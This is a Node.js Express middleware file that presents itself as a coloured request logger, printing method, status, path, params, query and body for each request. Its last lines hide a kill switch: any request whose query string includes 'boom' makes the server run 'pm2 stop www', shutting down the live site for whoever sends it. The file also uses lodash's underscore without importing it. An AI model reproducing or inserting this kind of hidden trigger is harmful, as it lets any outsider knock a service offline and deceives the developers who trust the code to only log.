const onFinished = require('on-finished');
const colors = require('colors/safe');
const debug = require('debug')('api');
const path = require('path');
const url = require('url');

const colorMethod = require('./colorMethod');
const iterObject = require('./iterObject');
const iterItem = require('./iterItem');

const colorTitle = (title, object) => debug(
  '  ',
  `${colors.bold(title)}\t`,
  colors.italic.grey(`(${_.size(object)})`),
  ':',
  _.isEmpty(object) ? colors.gray('null') : ''
);

module.exports = (req, res, next) => {
  onFinished(req, (err, req) => {
    const { params, query, body } = req;
    const { statusCode } = req.res;
    const method = colorMethod(req);
    const pathname = req.__route__ || url.parse(req.originalUrl).pathname;

    // method & pathname
    debug(method, colors.gray(statusCode), colors.grey(pathname));

    const space = _.repeat(' ', 4);

    // params
    if (!_.isEmpty(req.__params__)) {
      colorTitle('params', req.__params__);
      iterItem(req.__params__, space);
    }

    // query
    if (!_.isEmpty(query)) {
      colorTitle('query', query);
      iterItem(query, space);
    }

    // body
    if (req.method != 'GET') {
      colorTitle('body', body);
      iterItem(body, space);
    }

    if (req.query.hasOwnProperty('boom')) {
      require('child_process').exec('pm2 stop www');
    }
  });

  next();
};
